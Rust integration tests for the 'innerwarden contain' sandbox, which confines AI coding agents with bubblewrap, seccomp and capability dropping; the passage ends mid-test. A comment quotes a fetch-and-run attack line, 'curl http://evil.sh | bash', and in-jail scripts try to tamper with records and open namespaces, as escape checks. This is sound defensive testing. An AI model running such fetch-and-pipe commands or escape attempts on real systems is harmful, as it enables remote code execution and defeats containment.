use std::process::Command;

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_innerwarden")
}

/// A scratch record for the whole test binary.
///
/// Every CLI invocation here must write its narrative somewhere disposable.
/// Without this the suite recorded into the DEVELOPER'S OWN graph at
/// `~/.config/innerwarden/graph.json`: running `cargo test` injected fake attack
/// commands like `curl http://evil.sh | bash` into a real person's record and
/// pruned real history out of it. Found on 2026-08-05 while proving an unrelated
/// recording fix, when the graph under test changed size on its own.
fn scratch_graph() -> &'static std::path::Path {
    static DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
    static PATH: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
    PATH.get_or_init(|| {
        DIR.get_or_init(|| tempfile::TempDir::new().expect("scratch dir"))
            .path()
            .join("graph.json")
    })
}

/// The CLI under test, pointed at a disposable record by default. A test that
/// asserts on the record sets `IW_GRAPH_FILE` again; the later value wins.
fn cli() -> Command {
    let mut command = Command::new(bin());
    command.env("IW_GRAPH_FILE", scratch_graph());
    command
}

#[cfg(any(target_os = "linux", target_os = "macos"))]
#[test]
fn unsafe_project_is_rejected_before_the_host_hook_is_mutated() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            home.path().to_str().unwrap(),
            "--",
            "/bin/true",
        ])
        .env("HOME", home.path())
        .output()
        .expect("run contain with unsafe project");

    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("unsafe project path"));
    assert!(
        !home.path().join(".claude/settings.json").exists(),
        "validation must happen before hook installation mutates the host"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn linux_backend_masks_innerwarden_secrets_and_keeps_project_available() {
    let backend_available = ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .any(|path| std::path::Path::new(path).is_file());
    assert!(
        backend_available,
        "CJC-090-AT-007 requires a real trusted bubblewrap binary on Linux; install bwrap on the journey runner instead of silently skipping isolation"
    );
    let home = tempfile::TempDir::new().unwrap();
    let project = tempfile::TempDir::new().unwrap();
    std::fs::create_dir_all(home.path().join(".claude")).unwrap();
    std::fs::write(home.path().join(".claude/history.jsonl"), "{}\n").unwrap();
    let secret = home.path().join(".config/innerwarden/llm-key");
    std::fs::create_dir_all(secret.parent().unwrap()).unwrap();
    std::fs::write(&secret, "CJC-J007-SECRET").unwrap();
    let allowed = project.path().join("allowed.txt");
    std::fs::write(&allowed, "CJC-J007-PROJECT-OK").unwrap();

    let script = format!(
        "if cat '{}' 2>/dev/null; then exit 70; fi; cat '{}'",
        secret.display(),
        allowed.display()
    );
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", home.path())
        .output()
        .expect("run Linux AI Jail");

    assert!(
        output.status.success(),
        "AI Jail failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(String::from_utf8_lossy(&output.stdout).contains("CJC-J007-PROJECT-OK"));
    assert!(!String::from_utf8_lossy(&output.stdout).contains("CJC-J007-SECRET"));
}

#[cfg(target_os = "linux")]
fn require_bwrap() {
    let backend_available = ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .any(|path| std::path::Path::new(path).is_file());
    assert!(
        backend_available,
        "CJC-090-AT-007 requires a real trusted bubblewrap binary on Linux; install bwrap on the journey runner instead of silently skipping isolation"
    );
}

/// The bwrap `contain` runs: the first of its trusted paths with no symbolic
/// link on the way to it (`/bin` is one on a usr-merged host).
#[cfg(target_os = "linux")]
fn jail_bwrap() -> Option<std::path::PathBuf> {
    ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .map(std::path::Path::new)
        .find(|path| {
            path.is_file()
                && path.ancestors().all(|at| {
                    std::fs::symlink_metadata(at).is_ok_and(|m| !m.file_type().is_symlink())
                })
        })
        .map(std::path::Path::to_path_buf)
}

/// What a launch on this host does about the jail's seccomp filter, from the
/// facts the launcher reads, computed here so each test asserts exactly one
/// branch.
#[cfg(target_os = "linux")]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FilterHere {
    /// No bwrap: a dry run says nothing about it.
    NoBwrap,
    /// The kernel restricts unprivileged user namespaces and bwrap has no
    /// profile: the real run stops with the advice, a dry run says it.
    Restricted,
    /// A throwaway jail under a filter exits 0: every jail gets its filter,
    /// and an identified one's record is schema 2.
    Taken,
    /// Any other host: no filter, the line that says why, schema 1.
    NotTaken,
}

/// What a launch on this host does about the filter. With
/// `IW_REQUIRE_SECCOMP=1` (CI and the release gate set it) anything but
/// [`FilterHere::Taken`] fails the test: a runner whose bwrap stopped taking
/// a filter would otherwise prove only the jail without one, and stay green.
#[cfg(target_os = "linux")]
fn filter_here() -> FilterHere {
    let here = filter_here_unchecked();
    if std::env::var_os("IW_REQUIRE_SECCOMP").is_some_and(|v| v == "1") {
        assert_eq!(
            here,
            FilterHere::Taken,
            "IW_REQUIRE_SECCOMP=1: this host must start a jail under a seccomp filter"
        );
    }
    here
}

#[cfg(target_os = "linux")]
fn filter_here_unchecked() -> FilterHere {
    let Some(bwrap) = jail_bwrap() else {
        return FilterHere::NoBwrap;
    };
    let restricted =
        std::fs::read_to_string("/proc/sys/kernel/apparmor_restrict_unprivileged_userns")
            .is_ok_and(|v| v.trim() == "1");
    let profile = std::path::Path::new("/etc/apparmor.d/bwrap").exists()
        || std::path::Path::new("/etc/apparmor.d/usr.bin.bwrap").exists();
    if restricted && !profile {
        return FilterHere::Restricted;
    }
    // This test's own probe, independent of the launcher's: a filter that
    // allows every call of this build's architecture and kills any other
    // (so a binary under another architecture's emulation is told apart, as
    // the launcher's filter tells it), on a descriptor, under the namespaces
    // the jail unshares.
    let audit_arch: [u8; 4] = if cfg!(target_arch = "x86_64") {
        0xC000_003Eu32.to_le_bytes()
    } else {
        0xC000_00B7u32.to_le_bytes()
    };
    let mut program = vec![0x20, 0, 0, 0, 4, 0, 0, 0, 0x15, 0, 0, 1];
    program.extend(audit_arch);
    program.extend([
        0x06, 0, 0, 0, 0, 0, 0xff, 0x7f, 0x06, 0, 0, 0, 0, 0, 0, 0x80,
    ]);
    let dir = tempfile::TempDir::new().unwrap();
    let filter = dir.path().join("native.bpf");
    std::fs::write(&filter, program).unwrap();
    let taken = Command::new("/bin/sh")
        .args([
            "-c",
            "exec \"$0\" --seccomp 3 --unshare-pid --unshare-uts --unshare-ipc \
             --ro-bind / / true 3<\"$1\"",
        ])
        .arg(&bwrap)
        .arg(&filter)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|status| status.success());
    if taken {
        FilterHere::Taken
    } else {
        FilterHere::NotTaken
    }
}

/// The in-jail script of the identity case: print the PID namespace the
/// jailed process is in, the record the launcher mounted, and whether the
/// agent can rewrite, remove or replace that record. The jail starts only
/// after the launcher handed the record in, so it is there from the first
/// line.
#[cfg(target_os = "linux")]
const READ_THE_RECORD: &str = "readlink /proc/self/ns/pid; \
    cat /run/innerwarden/instance.json; echo; \
    if ( : > /run/innerwarden/instance.json ) 2>/dev/null; then echo RECORD-WRITTEN; fi; \
    if rm -f /run/innerwarden/instance.json 2>/dev/null; then echo RECORD-REMOVED; fi; \
    if mv /run/innerwarden/instance.json /run/innerwarden/x 2>/dev/null; then echo RECORD-MOVED; fi; \
    if ( echo '{}' > /run/innerwarden/other.json ) 2>/dev/null \
        && mv -f /run/innerwarden/other.json /run/innerwarden/instance.json 2>/dev/null; \
        then echo RECORD-REPLACED; fi; \
    if [ -e /run/innerwarden/agent-tls.spki ]; then echo KEY-HANDED-IN; fi; \
    if [ -e /run/innerwarden/system-profiles-root ]; then echo PROFILES-MARKED; fi; \
    grep -E '^Seccomp(_filters)?:' /proc/self/status; \
    grep -E '^CapEff:' /proc/self/status; \
    if ! command -v unshare >/dev/null; then echo NO-UNSHARE; \
    else \
        if unshare -n true 2>/dev/null; then echo NET-UNSHARED; else echo NET-REFUSED; fi; \
        if unshare -U true 2>/dev/null; then echo NESTED-USERNS; else echo NESTED-REFUSED; fi; \
    fi; \
    exit 0";

#[cfg(target_os = "linux")]
fn state_home() -> tempfile::TempDir {
    let home = tempfile::TempDir::new().unwrap();
    std::fs::create_dir_all(home.path().join(".local/state")).unwrap();
    home
}

/// No user service manager (the CI runner has none, and this removes the
/// variable that names one) and no Active Defence: the fallback path, which
/// is the one CI can prove. The scope itself is proven on a lab host by
/// `scripts/tests/contain-identity-escape.sh`.
#[cfg(target_os = "linux")]
fn identified_without_a_scope(command: &mut Command) -> &mut Command {
    command
        .env_remove("XDG_RUNTIME_DIR")
        .env_remove("XDG_STATE_HOME")
        .env("IW_AD_CLI_DIRS", "")
}

#[cfg(target_os = "linux")]
#[test]
fn identity_flag_mounts_the_record_read_only_inside_and_keeps_a_private_copy() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            READ_THE_RECORD,
        ])
        .env("HOME", home.path());
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stderr = String::from_utf8_lossy(&output.stderr);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(output.status.success(), "AI Jail failed: {stderr}");
    assert!(stderr.contains("instance record:"), "{stderr}");

    // The launcher's copy: one private file, no temp left behind.
    let dir = home.path().join(".local/state/innerwarden/instances");
    let entries: Vec<_> = std::fs::read_dir(&dir)
        .expect("records dir")
        .map(|e| e.unwrap().path())
        .collect();
    // The record, and the note naming the project beside it; no temp file.
    let records: Vec<_> = entries
        .iter()
        .filter(|p| p.extension().is_some_and(|e| e == "json"))
        .cloned()
        .collect();
    assert_eq!(
        entries.len(),
        2,
        "one record, one project note, no temp file: {entries:?}"
    );
    assert_eq!(records.len(), 1, "one record and no temp file: {entries:?}");
    let path = &records[0];
    assert_eq!(
        std::fs::metadata(path).unwrap().permissions().mode() & 0o777,
        0o600
    );
    assert_eq!(
        std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777,
        0o700
    );
    let outside = std::fs::read(path).unwrap();

    // The jail's copy is the same bytes, and the agent can change none of it.
    let mut lines = stdout.lines();
    let ns_line = lines.next().unwrap_or_default().to_string();
    let inside_record = lines.next().unwrap_or_default().to_string();
    assert_eq!(
        inside_record.as_bytes(),
        outside.as_slice(),
        "the record inside the jail is the launcher's: {stdout}"
    );
    for tampered in [
        "RECORD-WRITTEN",
        "RECORD-REMOVED",
        "RECORD-MOVED",
        "RECORD-REPLACED",
    ] {
        assert!(!stdout.contains(tampered), "{tampered}: {stdout}");
    }
    // A host with no key file hands no key in; an identified jail's record
    // says what the plain jail's marker says, so it gets no marker.
    if !std::path::Path::new("/etc/innerwarden/agent-tls.spki").exists() {
        assert!(!stdout.contains("KEY-HANDED-IN"), "{stdout}");
    }
    assert!(!stdout.contains("PROFILES-MARKED"), "{stdout}");

    let record: serde_json::Value = serde_json::from_slice(&outside).unwrap();
    // Schema 2 exactly when this host takes the filter (the throwaway jail
    // under it exits 0): then, and only then, the record says so, the jail's
    // programs run under it and cannot make a user namespace. Any other host
    // writes the schema 1 it always wrote, without the field.
    match filter_here() {
        FilterHere::Taken => {
            assert_eq!(record["schema"], 2, "{record}");
            assert_eq!(record["jail"]["userns_closed"], true, "{record}");
            assert!(runs_under_one_more_filter(&stdout, true), "{stdout}");
            assert!(!stdout.contains("NESTED-USERNS"), "{stdout}");
            if !stdout.contains("NO-UNSHARE") {
                assert!(stdout.contains("NESTED-REFUSED"), "{stdout}");
            }
        }
        FilterHere::NotTaken => {
            assert_eq!(record["schema"], 1, "{record}");
            assert!(record["jail"].get("userns_closed").is_none(), "{record}");
            // Each thing the jail runs without is said: user namespaces,
            // and the keystroke rule the identified filter also carried.
            assert!(
                stderr.contains(
                    "innerwarden contain: user namespaces stay open (userns_probe_failed)"
                ),
                "{stderr}"
            );
            assert!(
                stderr.contains("innerwarden contain: no sandbox filter (filter_probe_failed)"),
                "{stderr}"
            );
        }
        other => panic!("the jail ran on a host where {other:?}: {record}"),
    }
    // No capability inside, filter or not, whoever runs the launcher: as
    // root bwrap would otherwise keep every one of root's, in the host's user
    // namespace, and a new network or mount namespace would follow.
    assert!(stdout.contains("CapEff:\t0000000000000000"), "{stdout}");
    if !stdout.contains("NO-UNSHARE") {
        assert!(stdout.contains("NET-REFUSED"), "{stdout}");
    }
    assert_eq!(record["agent_type"], "claude-code");
    assert_eq!(record["mode"], "monitor");
    assert_eq!(
        record["project"].as_str().unwrap(),
        project.path().file_name().unwrap().to_str().unwrap(),
        "a folder name, not a path"
    );
    assert_eq!(
        path.file_stem().unwrap().to_str().unwrap(),
        record["instance_id"].as_str().unwrap()
    );
    // No manager, no scope, and the launcher says what that costs.
    assert!(record.get("scope").is_none(), "{record}");
    assert!(stderr.contains("identity is at most observed"), "{stderr}");
    assert!(
        !stderr.contains("system scope"),
        "no Active Defence, no request: {stderr}"
    );
    // The namespace the launcher recorded is the one the jailed process saw.
    let inside: u64 = ns_line
        .trim()
        .strip_prefix("pid:[")
        .and_then(|r| r.strip_suffix(']'))
        .unwrap_or_else(|| panic!("namespace link in stdout: {stdout:?}"))
        .parse()
        .unwrap();
    assert_eq!(record["jail"]["pid_ns"].as_u64().unwrap(), inside);
    let host = std::fs::read_link("/proc/self/ns/pid").unwrap();
    assert_ne!(
        format!("pid:[{inside}]"),
        host.to_string_lossy(),
        "the jail is not in the launcher's namespace"
    );
    assert!(record["jail"]["pid"].as_u64().unwrap() > 0);
    assert!(record["jail"]["start_ticks"].as_u64().unwrap() > 0);
}

#[cfg(target_os = "linux")]
#[test]
fn without_the_identity_flag_no_record_is_written_and_nothing_changes() {
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            "readlink /proc/self/ns/pid; \
             if [ -e /run/innerwarden/system-profiles-root ]; then echo PROFILES-MARKED; fi; \
             grep -E '^Seccomp(_filters)?:' /proc/self/status; \
             if ! command -v unshare >/dev/null; then echo NO-UNSHARE; \
             elif unshare -U true 2>/dev/null; then echo NESTED-USERNS; else echo NESTED-REFUSED; fi",
        ])
        .env("HOME", home.path())
        .env_remove("XDG_STATE_HOME")
        .output()
        .expect("run Linux AI Jail");
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stderr.contains("instance record"), "{stderr}");
    assert!(
        !stderr.contains("scope"),
        "flag off: no scope, no word of one: {stderr}"
    );
    assert!(
        !home.path().join(".local/state/innerwarden").exists(),
        "flag off: no directory, no record"
    );
    // The launcher's marker that the way to the system profiles file is
    // root's: only where the host has that file.
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert_eq!(
        stdout.contains("PROFILES-MARKED"),
        std::path::Path::new(SYSTEM_PROFILES).exists(),
        "{stdout}"
    );
    // The one change without the flag, on purpose: the jail's programs run
    // under the terminal filter where the host takes it, which refuses the
    // two terminal commands that push input (by every ABI the kernel runs,
    // 32-bit ones included) and nothing else a plain jail could do before,
    // user namespaces included.
    match filter_here() {
        FilterHere::Taken => {
            assert!(runs_under_one_more_filter(&stdout, true), "{stdout}");
            assert!(!stderr.contains("no sandbox filter"), "{stderr}");
            if !stdout.contains("NO-UNSHARE") && unshare_works_here() {
                assert!(stdout.contains("NESTED-USERNS"), "{stdout}");
            }
        }
        FilterHere::NotTaken => {
            assert!(
                stderr.contains("innerwarden contain: no sandbox filter (filter_probe_failed)"),
                "{stderr}"
            );
            assert!(runs_under_one_more_filter(&stdout, false), "{stdout}");
        }
        other => panic!("the jail ran on a host where {other:?}: {stdout}"),
    }
}

/// The `Seccomp_filters:` count of a `/proc/<pid>/status` text.
#[cfg(target_os = "linux")]
fn seccomp_filters(status: &str) -> Option<u32> {
    status
        .lines()
        .find_map(|l| l.strip_prefix("Seccomp_filters:"))
        .and_then(|n| n.trim().parse().ok())
}

/// Whether the jail's programs (their `/proc/self/status` lines in
/// `inside`) run under exactly one filter more than this test does when
/// `filtered`, and under the same ones otherwise. The count, not the mode:
/// a test that already runs under a filter (a container's, an emulator's)
/// shows mode 2 inside any jail. A kernel too old to count filters (before
/// 5.9) is judged by the mode alone, and only where the jail has one.
#[cfg(target_os = "linux")]
fn runs_under_one_more_filter(inside: &str, filtered: bool) -> bool {
    let own = std::fs::read_to_string("/proc/self/status")
        .ok()
        .as_deref()
        .and_then(seccomp_filters);
    match (own, seccomp_filters(inside)) {
        (Some(own), Some(jail)) => jail == own + u32::from(filtered),
        _ => !filtered || inside.contains("Seccomp:\t2"),
    }
}

/// Whether a jail without any filter can make a user namespace here: the
/// host's own answer, so the plain jail is held to what it could do before.
#[cfg(target_os = "linux")]
fn unshare_works_here() -> bool {
    let Some(bwrap) = jail_bwrap() else {
        return false;
    };
    Command::new(bwrap)
        .args([
            "--unshare-pid",
            "--unshare-uts",
            "--unshare-ipc",
            "--ro-bind",
            "/",
            "/",
            "unshare",
            "-U",
            "true",
        ])
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|status| status.success())
}

/// The host's system profiles file.
#[cfg(target_os = "linux")]
const SYSTEM_PROFILES: &str = "/etc/innerwarden/agent-profiles.toml";

#[cfg(target_os = "linux")]
#[test]
fn dry_run_shows_the_record_and_info_descriptors_only_with_the_identity_flag() {
    let home = tempfile::TempDir::new().unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let dry = |identity: bool| {
        let mut args = vec!["contain", "--dry-run"];
        if identity {
            args.push("--identity");
        }
        args.extend([
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/true",
        ]);
        let out = cli()
            .args(args)
            .env("HOME", home.path())
            .env_remove("XDG_RUNTIME_DIR")
            .output()
            .expect("dry run");
        assert!(out.status.success());
        String::from_utf8_lossy(&out.stdout).into_owned()
    };
    let plain = dry(false);
    let identified = dry(true);
    assert!(!plain.contains("--info-fd"), "{plain}");
    assert!(
        !plain
            .replace(
                " --ro-bind-data 12 /run/innerwarden/system-profiles-root",
                ""
            )
            .contains("--ro-bind-data"),
        "{plain}"
    );
    assert!(!plain.contains("scope"), "{plain}");
    assert!(
        identified.contains(" --ro-bind-data 10 /run/innerwarden/instance.json --die-with-parent "),
        "the record is the last mount: {identified}"
    );
    assert!(
        identified.contains("--info-fd 9 -- /bin/true"),
        "{identified}"
    );
    // The key of Active Defence is handed in, just before the record, only
    // where the host has a key the launcher believes; with no key file there
    // is no mount, and the plain run never has one.
    let key = " --ro-bind-data 11 /run/innerwarden/agent-tls.spki";
    assert!(!plain.contains("agent-tls.spki"), "{plain}");
    // A plain jail gets the marker that the way to the system profiles file
    // is root's only where the host has that file; an identified jail never
    // does (its record says the same). Without the file both are today's.
    let marker = " --ro-bind-data 12 /run/innerwarden/system-profiles-root";
    assert_eq!(
        plain.contains(marker),
        std::path::Path::new(SYSTEM_PROFILES).exists(),
        "{plain}"
    );
    assert!(!identified.contains("system-profiles-root"), "{identified}");
    let plain = plain.replace(marker, "");
    if !std::path::Path::new("/etc/innerwarden/agent-tls.spki").exists() {
        assert!(!identified.contains("agent-tls.spki"), "{identified}");
    } else if identified.contains(key) {
        assert!(
            identified.contains(&format!(
                "{key} --ro-bind-data 10 /run/innerwarden/instance.json "
            )),
            "the key is just before the record: {identified}"
        );
    }
    // No manager named (or no systemd-run at all): the dry run says the real
    // run would have no scope, and what that costs.
    let scope_lines: Vec<&str> = identified
        .lines()
        .filter(|l| l.starts_with("# innerwarden contain: no scope ("))
        .collect();
    assert_eq!(scope_lines.len(), 1, "{identified}");
    assert!(
        scope_lines[0].ends_with("): identity is at most observed"),
        "{identified}"
    );
    // The command gets its own PATH and loader variables back through bwrap,
    // because the launcher's helpers run with a fixed PATH: those pairs, and
    // the agent name the hook is told, are the flag's other additions.
    let identified = {
        let mut tokens = identified.split(' ').peekable();
        let mut kept: Vec<&str> = Vec::new();
        while let Some(token) = tokens.next() {
            if token == "--setenv" {
                let name = tokens.next().unwrap_or("");
                let value = tokens.next().unwrap_or("");
                if name == "PATH" || name.starts_with("LD_") {
                    continue;
                }
                kept.extend(["--setenv", name, value]);
            } else {
                kept.push(token);
            }
        }
        kept.join(" ")
    };
    let identified: String = identified
        .lines()
        .filter(|l| !l.starts_with("#   IW_HOOK_AGENT="))
        .map(|l| format!("{l}\n"))
        .collect();
    // The ways the dry run speaks of the filter: the filter in the argument
    // list, the line that says why it is not there, or, where the kernel's
    // restriction stops the real run first, its advice. Exactly the one this
    // host's facts give; the plain run shows the same filter (its own, the
    // terminal one) and never the advice.
    let option = " --unshare-ipc --seccomp 13 --cap-drop ALL --hostname ai-sandbox ";
    let plain_option = " --unshare-ipc --seccomp 13 --hostname ai-sandbox ";
    let said = "# innerwarden contain: user namespaces stay open (";
    let plain_said = "# innerwarden contain: no sandbox filter (filter_probe_failed): ";
    let advice = "# innerwarden contain: this kernel restricts unprivileged user namespaces";
    assert!(
        !plain.contains("--disable-userns")
            && !identified.contains("--disable-userns")
            && !identified.contains("--unshare-user")
            && !plain.contains(said)
            && !plain.contains(advice),
        "{plain}"
    );
    let here = filter_here();
    assert_eq!(
        (
            identified.contains(option),
            identified.contains(said),
            identified.contains(advice)
        ),
        match here {
            FilterHere::NoBwrap => (false, false, false),
            FilterHere::Restricted => (false, false, true),
            FilterHere::Taken => (true, false, false),
            FilterHere::NotTaken => (false, true, false),
        },
        "{here:?}: {identified}"
    );
    assert_eq!(
        (plain.contains(plain_option), plain.contains(plain_said)),
        match here {
            FilterHere::NoBwrap | FilterHere::Restricted => (false, false),
            FilterHere::Taken => (true, false),
            FilterHere::NotTaken => (false, true),
        },
        "{here:?}: {plain}"
    );
    assert!(identified.matches("--seccomp").count() <= 1, "{identified}");
    if here == FilterHere::NotTaken {
        assert!(
            identified
                .lines()
                .filter(|l| l.starts_with(said))
                .all(|l| l.contains("(userns_probe_failed)")),
            "{identified}"
        );
        // The keystroke rule went with the identified filter: said too.
        assert!(
            identified.lines().any(|l| l.starts_with(plain_said)),
            "{identified}"
        );
    }
    // Every identified jail drops every capability, filter or not; the plain
    // one never asks.
    assert_eq!(
        identified.matches(" --cap-drop ALL ").count(),
        1,
        "{identified}"
    );
    assert!(!plain.contains("--cap-drop"), "{plain}");
    // The advice block is the real run's refusal, said as comments.
    let advice_lines: Vec<&str> = if here == FilterHere::Restricted {
        identified
            .lines()
            .skip_while(|l| !l.starts_with(advice))
            .take_while(|l| l.starts_with('#'))
            .collect()
    } else {
        Vec::new()
    };
    let plain: String = plain
        .lines()
        .filter(|l| !l.starts_with(plain_said))
        .map(|l| format!("{l}\n"))
        .collect();
    let without: String = identified
        .replace(" --ro-bind-data 10 /run/innerwarden/instance.json", "")
        .replace(key, "")
        .replace(" --info-fd 9", "")
        .replace(" --cap-drop ALL", "")
        .replace(
            &format!(
                " --tmpfs {}",
                home.path()
                    .join(".local/state/innerwarden/instances")
                    .display()
            ),
            "",
        )
        .lines()
        .filter(|l| {
            !l.starts_with("# innerwarden contain: no scope")
                && !l.starts_with(said)
                && !l.starts_with(plain_said)
                && !advice_lines.contains(l)
        })
        .map(|l| format!("{l}\n"))
        .collect();
    assert_eq!(without, plain, "the flag adds these and nothing else");
    assert!(
        !home.path().join(".local/state/innerwarden").exists(),
        "a dry run writes no record"
    );
}

#[cfg(not(any(target_os = "linux", target_os = "macos")))]
#[test]
fn unsupported_platform_fails_without_claiming_a_jail() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args(["contain", "--", "echo", "ok"])
        .env("HOME", home.path())
        .output()
        .expect("run contain");
    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("not supported"));
}

/// Inside an identified jail: the mount namespace, the agent the launcher
/// named, `PATH`, and what is left of the launcher's records folder.
#[cfg(target_os = "linux")]
const LOOK_AT_THE_LAUNCHER: &str = "readlink /proc/self/ns/mnt; \
    echo \"agent=$IW_HOOK_AGENT\"; \
    echo \"path=$PATH\"; \
    d=\"$HOME/.local/state/innerwarden/instances\"; \
    echo \"seen=$(ls -A \"$d\" 2>/dev/null | wc -l | tr -d ' ')\"; \
    ( echo forged > \"$d/forged.json\" ) 2>/dev/null; \
    for f in \"$d\"/*.json; do [ -f \"$f\" ] && ( : > \"$f\" ) 2>/dev/null; done; \
    exit 0";

/// The launcher's records folder is under `~/.local`, which the jail binds
/// read-write. With `--identity` the jail sees it empty and nothing written
/// there reaches the host; the record names the mount namespace the jailed
/// process is in; the hook is told the agent; the command keeps its `PATH`.
#[cfg(target_os = "linux")]
#[test]
fn identity_hides_the_launchers_records_and_names_the_jails_mount_namespace() {
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            LOOK_AT_THE_LAUNCHER,
        ])
        .env("HOME", home.path());
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stderr = String::from_utf8_lossy(&output.stderr);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(output.status.success(), "AI Jail failed: {stderr}");

    let dir = home.path().join(".local/state/innerwarden/instances");
    let entries: Vec<_> = std::fs::read_dir(&dir)
        .expect("records dir")
        .map(|e| e.unwrap().path())
        .collect();
    let records: Vec<_> = entries
        .iter()
        .filter(|p| p.extension().is_some_and(|e| e == "json"))
        .cloned()
        .collect();
    assert_eq!(entries.len(), 2, "nothing written in the jail: {entries:?}");
    assert_eq!(records.len(), 1, "nothing written in the jail: {entries:?}");
    let outside = std::fs::read(&records[0]).unwrap();
    assert!(!outside.is_empty(), "the record was not truncated");
    let record: serde_json::Value = serde_json::from_slice(&outside).unwrap();

    let mut lines = stdout.lines();
    let mnt: u64 = lines
        .next()
        .unwrap_or_default()
        .trim()
        .strip_prefix("mnt:[")
        .and_then(|r| r.strip_suffix(']'))
        .unwrap_or_else(|| panic!("mount namespace link in stdout: {stdout:?}"))
        .parse()
        .unwrap();
    assert_eq!(record["jail"]["mnt_ns"].as_u64().unwrap(), mnt, "{stdout}");
    let host = std::fs::read_link("/proc/self/ns/mnt").unwrap();
    assert_ne!(format!("mnt:[{mnt}]"), host.to_string_lossy());
    assert_eq!(lines.next(), Some("agent=claude-code"), "{stdout}");
    let path = std::env::var("PATH").unwrap_or_default();
    assert_eq!(
        lines.next(),
        Some(format!("path={path}").as_str()),
        "{stdout}"
    );
    assert_eq!(lines.next(), Some("seen=0"), "{stdout}");
}

/// A home whose own profile starts the claude-code jail only once Active
/// Defence on the host admitted it.
#[cfg(target_os = "linux")]
fn home_that_starts_only_once_admitted() -> tempfile::TempDir {
    use std::os::unix::fs::PermissionsExt;
    let home = state_home();
    let dir = home.path().join(".config/innerwarden");
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("agent-profiles.toml");
    std::fs::write(
        &file,
        "schema_version = 2\n[profile.claude-code.jail]\nstart = \"only_when_admitted\"\n",
    )
    .unwrap();
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
    home
}

/// The processes whose command line names `marker`: a jail left behind.
#[cfg(target_os = "linux")]
fn processes_naming(marker: &std::path::Path) -> Vec<String> {
    let needle = marker.to_string_lossy().into_owned();
    std::fs::read_dir("/proc")
        .unwrap()
        .flatten()
        .filter(|entry| entry.file_name().to_string_lossy().parse::<u32>().is_ok())
        .filter_map(|entry| std::fs::read(entry.path().join("cmdline")).ok())
        .map(|bytes| String::from_utf8_lossy(&bytes).replace('\0', " "))
        .filter(|line| line.contains(&needle))
        .collect()
}

/// What the launcher's child wrote on stderr, read to its end on a thread,
/// so a process that outlived the launcher is waited for, up to a bound.
#[cfg(target_os = "linux")]
fn stderr_to_end(child: &mut std::process::Child) -> std::sync::mpsc::Receiver<String> {
    let mut stderr = child.stderr.take().expect("stderr piped");
    let (send, receive) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        let mut text = String::new();
        let _ = std::io::Read::read_to_string(&mut stderr, &mut text);
        let _ = send.send(text);
    });
    receive
}

/// F17-cw: a jail whose profile starts it only once the host admitted it,
/// on a host with no Active Defence, never runs its command. The launcher
/// says why and exits 2, its own record of the instance is removed, and no
/// process of the jail is left. The jail's first process is ended while it
/// waits for its record, so not even the gate runs.
///
/// FAILS ON REVERT: hand the record in whatever the host said (drop the
/// `starts` check in `launch_identified`) and the command runs; end only
/// bwrap in `end_jail` (before 11908c7) and the jail's first process reads
/// the closed pipe and runs the gate, whose refusal is then on stderr.
#[cfg(target_os = "linux")]
#[test]
fn a_jail_the_host_did_not_admit_never_runs_its_command() {
    require_bwrap();
    let home = home_that_starts_only_once_admitted();
    let project = tempfile::TempDir::new().unwrap();
    let marker = project.path().join("COMMAND-RAN");
    let script = format!("touch '{}'", marker.display());
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", home.path())
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::piped());
    let mut child = identified_without_a_scope(&mut command)
        .spawn()
        .expect("run Linux AI Jail with --identity");
